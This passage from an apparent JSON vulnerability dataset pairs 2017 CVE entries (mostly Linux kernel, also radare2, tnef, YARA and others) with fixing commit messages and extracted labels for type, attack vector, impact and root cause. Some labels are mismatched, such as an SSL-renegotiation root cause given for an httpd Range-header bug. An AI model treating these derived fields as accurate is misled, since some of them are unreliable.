denial of service","Root Cause":"does not properly restrict association peel - off operations during certain wait states ,","Attack Type":"local attacker"},{"commit_id":"4c03b862b12f980456f9de92db6d508a4999b788","cve_id":"CVE-2017-6348","cwe_id":null,"commit_message":"irda: Fix lockdep annotations in hashbin_delete().\n\nA nested lock depth was added to the hasbin_delete() code but it\ndoesn't actually work some well and results in tons of lockdep splats.\n\nFix the code instead to properly drop the lock around the operation\nand just keep peeking the head of the hashbin queue.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nTested-by: Dmitry Vyukov <dvyukov@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The hashbin_delete function in net\/irda\/irqueue.c in the Linux kernel before 4.9.13 improperly manages lock dropping, which allows local users to cause a denial of service (deadlock) via crafted operations on IrDA devices.","commit_message_1":"fix lockdep annotation in hashbin_delete ( )","Vulnerability Type":"deadlock","Attack Vector":"via crafted operations on irda devices","Impact":"cause a denial of service ( deadlock )","Root Cause":"caused by improperly managing lock dropping by the hashbin_delete function","Attack Type":"local attacker"},{"commit_id":"ca4ef4574f1ee5252e2cd365f8f5d5bafd048f32","cve_id":"CVE-2017-6347","cwe_id":"CWE-125","commit_message":"ip: fix IP_CHECKSUM handling\n\nThe skbs processed by ip_cmsg_recv() are not guaranteed to\nbe linear e.g. when sending UDP packets over loopback with\nMSGMORE.\nUsing csum_partial() on [potentially] the whole skb len\nis dangerous; instead be on the safe side and use skb_checksum().\n\nThanks to syzkaller team to detect the issue and provide the\nreproducer.\n\nv1 -> v2:\n - move the variable declaration in a tighter scope\n\nFixes: ad6f939ab193 (\"ip: Add offset parameter to ip_cmsg_recv\")\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nSigned-off-by: Paolo Abeni <pabeni@redhat.com>\nAcked-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The ip_cmsg_recv_checksum function in net\/ipv4\/ip_sockglue.c in the Linux kernel before 4.10.1 has incorrect expectations about skb data layout, which allows local users to cause a denial of service (buffer over-read) or possibly have unspecified other impact via crafted system calls, as demonstrated by use of the MSG_MORE flag in conjunction with loopback UDP transmission.","commit_message_1":"fix ip_checksum handling the skbs processed by ip_cmsg_recv ( ) are not guaranteed to be linear <file>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via crafted system calls , as demonstrated by use of the msg _ more flag in conjunction with loopback udp transmission","Impact":"cause a denial of service ( buffer over - read ) or possibly have unspecified other impact","Root Cause":"has incorrect expectations about skb data layout","Attack Type":"local attacker"},{"commit_id":"d199fab63c11998a602205f7ee7ff7c05c97164b","cve_id":"CVE-2017-6346","cwe_id":"CWE-416","commit_message":"packet: fix races in fanout_add()\n\nMultiple threads can call fanout_add() at the same time.\n\nWe need to grab fanout_mutex earlier to avoid races that could\nlead to one thread freeing po->rollover that was set by another thread.\n\nDo the same in fanout_release(), for peace of mind, and to help us\nfinding lockdep issues earlier.\n\nFixes: dc99f600698d (\"packet: Add fanout support.\")\nFixes: 0648ab70afe6 (\"packet: rollover prepare: per-socket state\")\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nCc: Willem de Bruijn <willemb@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Race condition in net\/packet\/af_packet.c in the Linux kernel before 4.9.13 allows local users to cause a denial of service (use-after-free) or possibly have unspecified other impact via a multithreaded application that makes PACKET_FANOUT setsockopt system calls.","commit_message_1":"fix race in fanout_add ( ) multiple thread can call fanout_add ( ) at the same time","Vulnerability Type":"Use After Free","Attack Vector":"via a multithreaded application that makes packet _ fanout setsockopt system calls","Impact":"cause a denial of service ( use - after - free ) or possibly have unspecified other impact","Root Cause":"caused by an use-after-free error","Attack Type":"local attacker"},{"commit_id":"8b74d439e1697110c5e5c600643e823eb1dd0762","cve_id":"CVE-2017-6345","cwe_id":"CWE-20","commit_message":"net\/llc: avoid BUG_ON() in skb_orphan()\n\nIt seems nobody used LLC since linux-3.12.\n\nFortunately fuzzers like syzkaller still know how to run this code,\notherwise it would be no fun.\n\nSetting skb->sk without skb->destructor leads to all kinds of\nbugs, we now prefer to be very strict about it.\n\nIdeally here we would use skb_set_owner() but this helper does not exist yet,\nonly CAN seems to have a private helper for that.\n\nFixes: 376c7311bdb6 (\"net: add a temporary sanity check in skb_orphan()\")\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The LLC subsystem in the Linux kernel before 4.9.13 does not ensure that a certain destructor exists in required circumstances, which allows local users to cause a denial of service (BUG_ON) or possibly have unspecified other impact via crafted system calls.","commit_message_1":"avoid bug_on ( ) in skb_orphan ( ) it seems nobody used llc since linux-<file>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted system calls","Impact":"cause a denial of service ( bug _ on ) or possibly have unspecified other impact","Root Cause":"does not ensure that a certain destructor exists","Attack Type":"local attacker"},{"commit_id":"ad55822430a03fe075221b543efb434567e9e431","cve_id":"CVE-2017-6319","cwe_id":"CWE-119","commit_message":"Fix #6836 - oob write in dex","summary":"The dex_parse_debug_item function in libr\/bin\/p\/bin_dex.c in radare2 1.2.1 allows remote attackers to cause a denial of service (buffer overflow and application crash) or possibly have unspecified other impact via a crafted DEX file.","commit_message_1":"fix # <number> - oob write in dex","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted dex file","Impact":"cause a denial of service ( buffer overflow and application crash ) or possibly have unspecified other impact","Root Cause":"caused by a buffer overflow","Attack Type":"remote attacker"},{"commit_id":"8dccf79857ceeb7a6d3e42c1e762e7b865d5344d","cve_id":"CVE-2017-6310","cwe_id":"CWE-125","commit_message":"Check types to avoid invalid reads\/writes.","summary":"An issue was discovered in tnef before 1.4.13. Four type confusions have been identified in the file_add_mapi_attrs() function. These might lead to invalid read and write operations, controlled by an attacker.","commit_message_1":"check type to avoid invalid reads\/writes","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially crafted winmail.dat file","Impact":"execute arbitrary code","Root Cause":"caused by a type confusion","Attack Type":"remote attacker"},{"commit_id":"c5044689e50039635e7700fe2472fd632ac77176","cve_id":"CVE-2017-6308","cwe_id":"CWE-190","commit_message":"Fix integer overflows and harden memory allocator.","summary":"An issue was discovered in tnef before 1.4.13. Several Integer Overflows, which can lead to Heap Overflows, have been identified in the functions that wrap memory allocation.","commit_message_1":"fix integer overflow and harden memory allocator","Vulnerability Type":"integer overflow","Attack Vector":"By persuading a victim to open a specially crafted winmail.dat file","Impact":"overflow a buffer and execute arbitrary code on the system","Root Cause":"caused by improper bounds checking by the functions that wrap memory allocation","Attack Type":"remote attacker"},{"commit_id":"1a17af1ed0c791aec44dbdc9eab91218cc1e335a","cve_id":"CVE-2017-6307","cwe_id":"CWE-125","commit_message":"Use asserts on lengths to prevent invalid reads\/writes.","summary":"An issue was discovered in tnef before 1.4.13. Two OOB Writes have been identified in src\/mapi_attr.c:mapi_attr_read(). These might lead to invalid read and write operations, controlled by an attacker.","commit_message_1":"use asserts on length to prevent invalid reads\/writes","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By persuading a victim to open a specially crafted winmail.dat file","Impact":"execute arbitrary code","Root Cause":"caused by an out-of-bounds write","Attack Type":"remote attacker"},{"commit_id":"ccf7abb93af09ad0868ae9033d1ca8108bdaec82","cve_id":"CVE-2017-6214","cwe_id":"CWE-835","commit_message":"tcp: avoid infinite loop in tcp_splice_read()\n\nSplicing from TCP socket is vulnerable when a packet with URG flag is\nreceived and stored into receive queue.\n\n__tcp_splice_read() returns 0, and sk_wait_data() immediately\nreturns since there is the problematic skb in queue.\n\nThis is a nice way to burn cpu (aka infinite loop) and trigger\nsoft lockups.\n\nAgain, this gem was found by syzkaller tool.\n\nFixes: 9c55e01c0cc8 (\"[TCP]: Splice receive support.\")\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nReported-by: Dmitry Vyukov  <dvyukov@google.com>\nCc: Willy Tarreau <w@1wt.eu>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The tcp_splice_read function in net\/ipv4\/tcp.c in the Linux kernel before 4.9.11 allows remote attackers to cause a denial of service (infinite loop and soft lockup) via vectors involving a TCP packet with the URG flag.","commit_message_1":"avoid infinite loop in tcp_splice_read ( ) splicing from tcp socket is vulnerable when a packet with urg flag is received and stored into receive queue","Vulnerability Type":"Infinite Loop","Attack Vector":"via vectors involving a tcp packet with the urg flag .","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"1ea23bd6040441a21fbcfba69dce9a01af03f989","cve_id":"CVE-2017-6197","cwe_id":"CWE-476","commit_message":"Fix #6816 - null deref in r_read_*","summary":"The r_read_* functions in libr\/include\/r_endian.h in radare2 1.2.1 allow remote attackers to cause a denial of service (NULL pointer dereference and application crash) via a crafted binary file, as demonstrated by the r_read_le32 function.","commit_message_1":"fix # <number> - null deref in r_read_ *","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted binary file , as demonstrated by the r _ read _ le32 function","Impact":"cause a denial of service ( pointer dereference and application crash )","Root Cause":"caused by a NULL pointer dereference error","Attack Type":"remote attacker"},{"commit_id":"72794dc3523bbd5bb370de3c5857cb736c387e18","cve_id":"CVE-2017-6194","cwe_id":"CWE-119","commit_message":"Fix #6829 oob write because of using wrong struct","summary":"The relocs function in libr\/bin\/p\/bin_bflt.c in radare2 1.2.1 allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted binary file.","commit_message_1":"fix # <number> oob write because of using wrong struct","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted binary file ","Impact":"cause a denial of service ( heap - based buffer overflow and application crash ) or possibly have unspecified other impact","Root Cause":"caused by heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"5edabca9d4cff7f1f2b68f0bac55ef99d9798ba4","cve_id":"CVE-2017-6074","cwe_id":"CWE-415","commit_message":"dccp: fix freeing skb too early for IPV6_RECVPKTINFO\n\nIn the current DCCP implementation an skb for a DCCP_PKT_REQUEST packet\nis forcibly freed via __kfree_skb in dccp_rcv_state_process if\ndccp_v6_conn_request successfully returns.\n\nHowever, if IPV6_RECVPKTINFO is set on a socket, the address of the skb\nis saved to ireq->pktopts and the ref count for skb is incremented in\ndccp_v6_conn_request, so skb is still in use. Nevertheless, it gets freed\nin dccp_rcv_state_process.\n\nFix by calling consume_skb instead of doing goto discard and therefore\ncalling __kfree_skb.\n\nSimilar fixes for TCP:\n\nfb7e2399ec17f1004c0e0ccfd17439f8759ede01 [TCP]: skb is unexpectedly freed.\n0aea76d35c9651d55bbaf746e7914e5f9ae5a25d tcp: SYN packets are now\nsimply consumed\n\nSigned-off-by: Andrey Konovalov <andreyknvl@google.com>\nAcked-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The dccp_rcv_state_process function in net\/dccp\/input.c in the Linux kernel through 4.9.11 mishandles DCCP_PKT_REQUEST packet data structures in the LISTEN state, which allows local users to obtain root privileges or cause a denial of service (double free) via an application that makes an IPV6_RECVPKTINFO setsockopt system call.","commit_message_1":"fix freeing skb too early for ipv6_recvpktinfo in the current dccp implementation an skb for a dccp_pkt_request packet is forcibly freed via __kfree_skb in dccp_rcv_state_process if dccp_v6_conn_request successfully return","Vulnerability Type":"double free","Attack Vector":"via an application that makes an ipv6 _ recvpktinfo setsockopt system call","Impact":"obtain root privileges or cause a denial of service","Root Cause":"caused by improper handling of DCCP_PKT_REQUEST packet data structures","Attack Type":"local attacker"},{"commit_id":"612e309bfffd6f9b8ad7cdccda3019fc0865f3b4","cve_id":"CVE-2017-6059","cwe_id":"CWE-20","commit_message":"don't echo query params on invalid requests to redirect URI; closes #212\n\nthanks @LukasReschke; I'm sure there's some OWASP guideline that warns\nagainst this","summary":"Mod_auth_openidc.c in the Ping Identity OpenID Connect authentication module for Apache (aka mod_auth_openidc) before 2.14 allows remote attackers to spoof page content via a malicious URL provided to the user, which triggers an invalid request.","commit_message_1":"do n't echo query params on invalid request to redirect uri ; close # <number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a malicious url provided to the user , which triggers an invalid request","Impact":"spoof page content","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"321027c1fe77f892f4ea07846aeae08cefbbb290","cve_id":"CVE-2017-6001","cwe_id":"CWE-362","commit_message":"perf\/core: Fix concurrent sys_perf_event_open() vs. 'move_group' race\n\nDi Shen reported a race between two concurrent sys_perf_event_open()\ncalls where both try and move the same pre-existing software group\ninto a hardware context.\n\nThe problem is exactly that described in commit:\n\n  f63a8daa5812 (\"perf: Fix event->ctx locking\")\n\n... where, while we wait for a ctx->mutex acquisition, the event->ctx\nrelation can have changed under us.\n\nThat very same commit failed to recognise sys_perf_event_context() as an\nexternal access vector to the events and thereby didn't apply the\nestablished locking rules correctly.\n\nSo while one sys_perf_event_open() call is stuck waiting on\nmutex_lock_double(), the other (which owns said locks) moves the group\nabout. So by the time the former sys_perf_event_open() acquires the\nlocks, the context we've acquired is stale (and possibly dead).\n\nApply the established locking rules as per perf_event_ctx_lock_nested()\nto the mutex_lock_double() for the 'move_group' case. This obviously means\nwe need to validate state after we acquire the locks.\n\nReported-by: Di Shen (Keen Lab)\nTested-by: John Dias <joaodias@google.com>\nSigned-off-by: Peter Zijlstra (Intel) <peterz@infradead.org>\nCc: Alexander Shishkin <alexander.shishkin@linux.intel.com>\nCc: Arnaldo Carvalho de Melo <acme@kernel.org>\nCc: Arnaldo Carvalho de Melo <acme@redhat.com>\nCc: Jiri Olsa <jolsa@redhat.com>\nCc: Kees Cook <keescook@chromium.org>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nCc: Min Chong <mchong@google.com>\nCc: Peter Zijlstra <peterz@infradead.org>\nCc: Stephane Eranian <eranian@google.com>\nCc: Thomas Gleixner <tglx@linutronix.de>\nCc: Vince Weaver <vincent.weaver@maine.edu>\nFixes: f63a8daa5812 (\"perf: Fix event->ctx locking\")\nLink: http:\/\/lkml.kernel.org\/r\/20170106131444.GZ3174@twins.programming.kicks-ass.net\nSigned-off-by: Ingo Molnar <mingo@kernel.org>","summary":"Race condition in kernel\/events\/core.c in the Linux kernel before 4.9.7 allows local users to gain privileges via a crafted application that makes concurrent perf_event_open system calls for moving a software group into a hardware context.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2016-6786.","commit_message_1":"fix concurrent sys_perf_event_open ( ) v","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted application that makes concurrent perf _ event _ open system calls for moving a software group into a hardware context","Impact":"gain privileges","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"2dcab598484185dea7ec22219c76dcdd59e3cb90","cve_id":"CVE-2017-5986","cwe_id":"CWE-362","commit_message":"sctp: avoid BUG_ON on sctp_wait_for_sndbuf\n\nAlexander Popov reported that an application may trigger a BUG_ON in\nsctp_wait_for_sndbuf if the socket tx buffer is full, a thread is\nwaiting on it to queue more data and meanwhile another thread peels off\nthe association being used by the first thread.\n\nThis patch replaces the BUG_ON call with a proper error handling. It\nwill return -EPIPE to the original sendmsg call, similarly to what would\nhave been done if the association wasn't found in the first place.\n\nAcked-by: Alexander Popov <alex.popov@linux.com>\nSigned-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>\nReviewed-by: Xin Long <lucien.xin@gmail.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Race condition in the sctp_wait_for_sndbuf function in net\/sctp\/socket.c in the Linux kernel before 4.9.11 allows local users to cause a denial of service (assertion failure and panic) via a multithreaded application that peels off an association in a certain buffer-full state.","commit_message_1":"avoid bug_on on sctp_wait_for_sndbuf alexander popov reported that an application may trigger a bug_on in sctp_wait_for_sndbuf if the socket tx buffer is full , a thread is waiting on it to queue more data and meanwhile another thread peel off the association being used by the first thread","Vulnerability Type":"Race Condition","Attack Vector":"via a multithreaded application that peels off an association in a certain buffer - full state","Impact":"cause a denial of service ( assertion failure and panic )","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"16af238036a5464ae8f2420ed3af214f0de875f9","cve_id":"CVE-2017-5985","cwe_id":"CWE-862","commit_message":"CVE-2017-5985: Ensure target netns is caller-owned\n\nBefore this commit, lxc-user-nic could potentially have been tricked into\noperating on a network namespace over which the caller did not hold privilege.\n\nThis commit ensures that the caller is privileged over the network namespace by\ntemporarily dropping privilege.\n\nLaunchpad: https:\/\/bugs.launchpad.net\/ubuntu\/+source\/lxc\/+bug\/1654676\nReported-by: Jann Horn <jannh@google.com>\nSigned-off-by: Christian Brauner <christian.brauner@ubuntu.com>","summary":"lxc-user-nic in Linux Containers (LXC) allows local users with a lxc-usernet allocation to create network interfaces on the host and choose the name of those interfaces by leveraging lack of netns ownership check.","commit_message_1":"ensure target netns is caller-owned before this commit , lxc-user-nic could potentially have been tricked into operating on a network namespace over which the caller did not hold privilege","Vulnerability Type":"Missing Authorization","Attack Vector":"By utilizing lxc-usenet allocation","Impact":"create network interfaces on the host and choose the name of those interfaces","Root Cause":"caused by the lack of netns ownership check","Attack Type":"local attacker"},{"commit_id":"34b2cef20f19c87999fff3da4071e66937db9644","cve_id":"CVE-2017-5970","cwe_id":"CWE-476","commit_message":"ipv4: keep skb->dst around in presence of IP options\n\nAndrey Konovalov got crashes in __ip_options_echo() when a NULL skb->dst\nis accessed.\n\nipv4_pktinfo_prepare() should not drop the dst if (evil) IP options\nare present.\n\nWe could refine the test to the presence of ts_needtime or srr,\nbut IP options are not often used, so let's be conservative.\n\nThanks to syzkaller team for finding this bug.\n\nFixes: d826eb14ecef (\"ipv4: PKTINFO doesnt need dst reference\")\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The ipv4_pktinfo_prepare function in net\/ipv4\/ip_sockglue.c in the Linux kernel through 4.9.9 allows attackers to cause a denial of service (system crash) via (1) an application that makes crafted system calls or possibly (2) IPv4 traffic with invalid IP options.","commit_message_1":"keep skb- > dst around in presence of ip option andrey konovalov got crash in __ip_options_echo ( ) when a null skb- > dst is accessed","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via an application that makes crafted system calls or possibly ipv4 traffic with invalid ip options","Impact":"cause a denial of service ( system crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"38d418505e9ee2d326557e5639e8da49c298858f","cve_id":"CVE-2017-5940","cwe_id":"CWE-269","commit_message":"security fix","summary":"Firejail before 0.9.44.6 and 0.9.38.x LTS before 0.9.38.10 LTS does not comprehensively address dotfile cases during its attempt to prevent accessing user files with an euid of zero, which allows local users to conduct sandbox-escape attacks via vectors involving a symlink and the --private option. NOTE: this vulnerability exists because of an incomplete fix for CVE-2017-5180.","commit_message_1":"security fix","Vulnerability Type":"Improper Privilege Management","Attack Vector":"via vectors involving a symlink and the - - private option .","Impact":"conduct sandbox - escape attacks","Root Cause":"does not comprehensively address dotfile cases during its attempt to prevent accessing user files with an euid of zero ,","Attack Type":"local attacker"},{"commit_id":"ab906da53ff2a68c6fd6d1fa73f2b7c7bf0bc636","cve_id":"CVE-2017-5923","cwe_id":"CWE-125","commit_message":"Fix issue #597","summary":"libyara\/grammar.y in YARA 3.5.0 allows remote attackers to cause a denial of service (heap-based out-of-bounds read and application crash) via a crafted rule that is mishandled in the yara_yyparse function.","commit_message_1":"fix issue # <number>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted rule that is mishandled in the yara _ yyparse function","Impact":"cause a denial of service ( heap - based out - of - bounds read and application crash )","Root Cause":"caused by a heap-based out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"142cfc82b932bc211218fbd7bdda8c7ce83f19df","cve_id":"CVE-2017-5850","cwe_id":"CWE-770","commit_message":"Reimplement httpd's support for byte ranges.\n\nThe previous implementation loaded all the output into a single output\nbuffer and used its size to determine the Content-Length of the body.\n\nThe new implementation calculates the body length first and writes the\nindividual ranges in an async way using the bufferevent mechanism.\n\nThis prevents httpd from using too much memory and applies the\nwatermark and throttling mechanisms to range requests.\n\nProblem reported by Pierre Kim (pierre.kim.sec at gmail.com)\n\nOK benno@ sunil@","summary":"httpd in OpenBSD allows remote attackers to cause a denial of service (memory consumption) via a series of requests for a large file using an HTTP Range header.","commit_message_1":"reimplement httpd 's support for byte range","Vulnerability Type":"Allocation of Resources Without Limits or Throttling","Attack Vector":"via a series of requests for a large file using an http range header .","Impact":"cause a denial of service","Root Cause":"caused by an error related to SSL client-initiated renegotiation","Attack Type":"remote attacker"},{"commit_id":"d21017b52a585f145e8d62781bcc1c5fefc7ee37","cve_id":"CVE-2017-5847","cwe_id":"CWE-125","commit_message":"asfdemux: Check that we have enough data available before parsing bool\/uint extended content descriptors\n\nhttps:\/\/bugzilla.gnome.org\/show_bug.cgi?id=777955","summary":"The gst_asf_demux_process_ext_content_desc function in gst\/asfdemux\/gstasfdemux.c in gst-plugins-ugly in GStreamer allows remote attackers to cause a denial of service (out-of-bounds heap read) via vectors involving extended content descriptors.","commit_message_1":"check that we have enough data available before parsing bool\/uint extended content descriptor http : \/\/<file>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via vectors involving extended content descriptors","Impact":"cause a denial of service ( out - of - bounds heap read","Root Cause":"caused by an out-of-bounds heap read issue","Attack Type":"remote attacker"},{"commit_id":"e1d35d4dc7f089e6c9c080d556feedf9c706f0c7","cve_id":"CVE-2017-5669","cwe_id":"CWE-20","commit_message":"ipc\/shm: Fix shmat mmap nil-page protection\n\nThe issue is described here, with a nice testcase:\n\n    https:\/\/bugzilla.kernel.org\/show_bug.cgi?id=192931\n\nThe problem is that shmat() calls do_mmap_pgoff() with MAP_FIXED, and the\naddress rounded down to 0.  For the regular mmap case, the protection\nmentioned above is that the kernel gets to generate the address --\narch_get_unmapped_area() will always check for MAP_FIXED and return that\naddress.  So by the time we do security_mmap_addr(0) things get funky for\nshmat().\n\nThe testcase itself shows that while a regular user crashes, root will not\nhave a problem attaching a nil-page.  There are two possible fixes to\nthis.  The first, and which this patch does, is to simply allow root to\ncrash as well -- this is also regular mmap behavior, ie when hacking up\nthe testcase and adding mmap(...  |MAP_FIXED).  While this approach is the\nsafer option, the second alternative is to ignore SHM_RND if the rounded\naddress is 0, thus only having MAP_SHARED flags.  This makes the behavior\nof shmat() identical to the mmap() case.  The downside of this is\nobviously user visible, but does make sense in that it maintains semantics\nafter the round-down wrt 0 address and mmap.\n\nPasses shm related ltp tests.\n\nLink: http:\/\/lkml.kernel.org\/r\/1486050195-18629-1-git-send-email-dave@stgolabs.net\nSigned-off-by: Davidlohr Bueso <dbueso@suse.de>\nReported-by: Gareth Evans <gareth.evans@contextis.co.uk>\nCc: Manfred Spraul <manfred@colorfullife.com>\nCc: Michael Kerrisk <mtk.manpages@googlemail.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>","summary":"The do_shmat function in ipc\/shm.c in the Linux kernel through 4.9.12 does not restrict the address calculated by a certain rounding operation, which allows local users to map page zero, and consequently bypass a protection mechanism that exists for the mmap system call, by making crafted shmget and shmat system calls in a privileged context.","commit_message_1":"fix shmat mmap nil-page protection the issue is described here , with a nice testcase : http : \/\/<file>","Vulnerability Type":"Improper Input Validation","Attack Vector":"by making crafted shmget and shmat system calls in a privileged context","Impact":"map page zero , and consequently bypass a protection mechanism that exists for the mmap system call","Root Cause":"does not restrict the address calculated by a certain rounding operation","Attack Type":"local attacker"},{"commit_id":"30d598ce7cd3f136ee9d7097f39fa9818a272441","cve_id":"CVE-2017-5668","cwe_id":"CWE-476","commit_message":"purple: Fix crash on ft requests from unknown contacts\n\nFollowup to 701ab81 (included in 3.5) which was a partial fix which only\nimproved things for non-libpurple file transfers (that is, just jabber)","summary":"bitlbee-libpurple before 3.5.1 allows remote attackers to cause a denial of service (NULL pointer dereference and crash) and possibly execute arbitrary code via a file transfer request for a contact that is not in the contact list.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2016-10189.","commit_message_1":"fix crash on ft request from unknown contact followup to 701ab81 ( included in <file> ) which wa a partial fix which only improved thing for non-libpurple file transfer ( that is , just jabber )","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a file transfer request for a contact that is not in the contact list","Impact":"cause a denial of service ( pointer dereference and crash ) and possibly execute arbitrary code","Root Cause":"caused by a NULL pointer dereference. By using a specially-crafted file transfer request","Attack Type":"remote attacker"},{"commit_id":"98dcbbf0bf4854bf987557e55e55fff7abbf3ea9","cve_id":"CVE-2017-5601","cwe_id":"CWE-125","commit_message":"Fail with negative lha->compsize in lha_read_file_header_1()\nFixes a heap buffer overflow reported in Secunia SA74169","summary":"An error in the lha_read_file_header_1() function (archive_read_support_format_lha.c) in libarchive 3.2.2 allows remote attackers to trigger an out-of-bounds read memory access and subsequently cause a crash via a specially crafted archive.","commit_message_1":"fail with negative lha- > compsize in lha_read_file_header_1 ( )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a specially crafted archive","Impact":"trigger an out - of - bounds read memory access and subsequently cause a crash","Root Cause":"caused by an out-of-bounds memory access error","Attack Type":"remote attacker"},{"commit_id":"6b8ac63847bc2f958dd93c09edc941a0118992d9","cve_id":"CVE-2017-5577","cwe_id":"CWE-388","commit_message":"drm\/vc4: Return -EINVAL on the overflow checks failing.\n\nBy failing to set the errno, we'd continue on to trying to set up the\nRCL, and then oops on trying to dereference the tile_bo that binning\nvalidation should have set up.\n\nReported-by: Ingo Molnar <mingo@kernel.org>\nSigned-off-by: Eric Anholt <eric@anholt.net>\nFixes: d5b1a78a772f (\"drm\/vc4: Add support for drawing 3D frames.\")","summary":"The vc4_get_bcl function in drivers\/gpu\/drm\/vc4\/vc4_gem.c in the VideoCore DRM driver in the Linux kernel before 4.9.7 does not set an errno value upon certain overflow detections, which allows local users to cause a denial of service (incorrect pointer dereference and OOPS) via inconsistent size values in a VC4_SUBMIT_CL ioctl call.","commit_message_1":"return -einval on the overflow check failing","Vulnerability Type":"7PK - Errors","Attack Vector":"By using a specially-crafted a VC4_SUBMIT_CL ioctl system call with inconsistent size values","Impact":"cause a denial of service","Root Cause":"caused by the failure to set an errno value upon certain overflow detections by the vc4_get_bcl function","Attack Type":"local attacker"},{"commit_id":"0f2ff82e11c86c05d051cae32b58226392d33bbf","cve_id":"CVE-2017-5576","cwe_id":"CWE-190","commit_message":"drm\/vc4: Fix an integer overflow in temporary allocation layout.\n\nWe copy the unvalidated ioctl arguments from the user into kernel\ntemporary memory to run the validation from, to avoid a race where the\nuser updates the unvalidate contents in between validating them and\ncopying them into the validated BO.\n\nHowever, in setting up the layout of the kernel side, we failed to\ncheck one of the additions (the roundup() for shader_rec_offset)\nagainst integer overflow, allowing a nearly MAX_UINT value of\nbin_cl_size to cause us to under-allocate the temporary space that we\nthen copy_from_user into.\n\nReported-by: Murray McAllister <murray.mcallister@insomniasec.com>\nSigned-off-by: Eric Anholt <eric@anholt.net>\nFixes: d5b1a78a772f (\"drm\/vc4: Add support for drawing 3D frames.\")","summary":"Integer overflow in the vc4_get_bcl function in drivers\/gpu\/drm\/vc4\/vc4_gem.c in the VideoCore DRM driver in the Linux kernel before 4.9.7 allows local users to cause a denial of service or possibly have unspecified other impact via a crafted size value in a VC4_SUBMIT_CL ioctl call.","commit_message_1":"fix an integer overflow in temporary allocation layout","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted size value in a vc4 _ submit _ cl ioctl call","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"497de07d89c1410d76a15bec2bb41f24a2a89f31","cve_id":"CVE-2017-5551","cwe_id":null,"commit_message":"tmpfs: clear S_ISGID when setting posix ACLs\n\nThis change was missed the tmpfs modification in In CVE-2016-7097\ncommit 073931017b49 (\"posix_acl: Clear SGID bit when setting\nfile permissions\")\nIt can test by xfstest generic\/375, which failed to clear\nsetgid bit in the following test case on tmpfs:\n\n  touch $testfile\n  chown 100:100 $testfile\n  chmod 2755 $testfile\n  _runas -u 100 -g 101 -- setfacl -m u::rwx,g::rwx,o::rwx $testfile\n\nSigned-off-by: Gu Zheng <guzheng1@huawei.com>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>","summary":"The simple_set_acl function in fs\/posix_acl.c in the Linux kernel before 4.9.6 preserves the setgid bit during a setxattr call involving a tmpfs filesystem, which allows local users to gain group privileges by leveraging the existence of a setgid program with restrictions on execute permissions.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2016-7097.","commit_message_1":"clear s_isgid when setting posix acls this change wa missed the tmpfs modification in in <cve_id> commit 073931017b49 ( `` posix_acl : clear sgid bit when setting file permission '' ) it can test by xfstest generic\/<number> , which failed to clear setgid bit in the following test case on tmpfs : touch $ testfile chown <number> : <number> $ testfile chmod <number> $ testfile _runas -u <number> -g <number> -- setfacl -m u : :rwx , g : :rwx , o : :rwx $ testfile","Vulnerability Type":"unspecified","Attack Vector":"by leveraging the existence of a setgid program with restrictions on execute permissions","Impact":"gain group privileges","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"b9dc6f65bc5e232d1c05fe34b5daadc7e8bbf1fb","cve_id":"CVE-2017-5550","cwe_id":"CWE-200","commit_message":"fix a fencepost error in pipe_advance()\n\nThe logics in pipe_advance() used to release all buffers past the new\nposition failed in cases when the number of buffers to release was equal\nto pipe->buffers.  If that happened, none of them had been released,\nleaving pipe full.  Worse, it was trivial to trigger and we end up with\npipe full of uninitialized pages.  IOW, it's an infoleak.\n\nCc: stable@vger.kernel.org # v4.9\nReported-by: \"Alan 